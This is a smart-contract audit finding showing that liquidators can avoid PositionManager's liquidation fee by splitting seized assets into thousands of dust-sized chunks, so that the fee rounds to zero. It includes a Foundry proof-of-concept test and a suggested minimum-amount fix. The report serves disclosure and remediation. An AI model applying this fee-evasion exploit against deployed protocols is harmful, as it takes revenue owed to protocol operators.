# Liquidators could avoid paying fee to protocol by splitting asset received into multiple small chunks

### Summary

In order to liquidate a position, liquidators will have to pass two arrays into liquidate function: debt array for debts they want to repay, and asset array for assets they want to seize from that position.

The problem is that input asset array allows liquidators to receive same asset multiple times, and that there is no minimum amount for asset received. Liquidators could avoid paying fee by splitting the total amount of seized asset into a lot of very small chunks ( pushing a lot of elements into asset array, each of which only specifies a very small amount of asset to receive). 

### Root Cause

- In `PositionManager.sol:476` fee could become 0 if assetData[i].amt is small enough to make the product of `liquidationFee` and `assetData[i].amt` less than 1e18.

### Internal pre-conditions

1. Target position is liquidable.

### External pre-conditions

N/A

### Attack Path

1. Liquidator makes a very long asset array; each element of that array only seize a dust amount of asset.
2. Liquidator calls liquidate function.

### Impact

Loss of funds for protocol.

### PoC

```solidity
import { Action, Operation, AssetData, DebtData } from "src/PositionManager.sol";
function testLiquidationSmallChunks() public {
        asset3.mint(positionOwner, 10000);

        vm.startPrank(positionOwner);
        Action[] memory actions = new Action[](3);

        actions[0] = addToken(address(asset3));
        //PositionManager(positionManager).processBatch(position, actions);

        actions[1] = deposit(address(asset3), 10000);
        asset3.approve(address(positionManager), 10000);
        bytes memory data = abi.encode(linearRatePool, 750);

        actions[2] = Action({ op: Operation.Borrow, data: data });
        PositionManager(positionManager).processBatch(position, actions);
       
        vm.stopPrank();
        vm.startPrank(protocolOwner);
        riskEngine.setOracle(address(asset3), address(asset2Oracle)); //Decrease asset 3 price so that the position is liquidable
        vm.stopPrank();

        uint256 newFee = 0.2e18; // fee set to 20%
        vm.prank(positionManager.owner());
        positionManager.setLiquidationFee(newFee);
        assertEq(positionManager.liquidationFee(), newFee, "Liquidation fee should be updated");

        asset1.mint(user, 1000);
        
        vm.startPrank(user);
        asset1.approve(address(positionManager), 750);
        AssetData[] memory assetData = new AssetData[](2500);
        for (uint i; i < 2500; i++) {
            assetData[i].asset = address(asset3);
            assetData[i].amt = 4;
        }
        DebtData[] memory debtData = new DebtData[](1);
        debtData[0].poolId = linearRatePool;
        debtData[0].amt = 750;
        positionManager.liquidate(position, debtData, assetData);

        assertEq(asset3.balanceOf(positionManager.owner()), 0); //position owner won't get any fee at the end 
        vm.stopPrank();

    }

```

### Mitigation

Consider enforcing a minimum liquidation amount
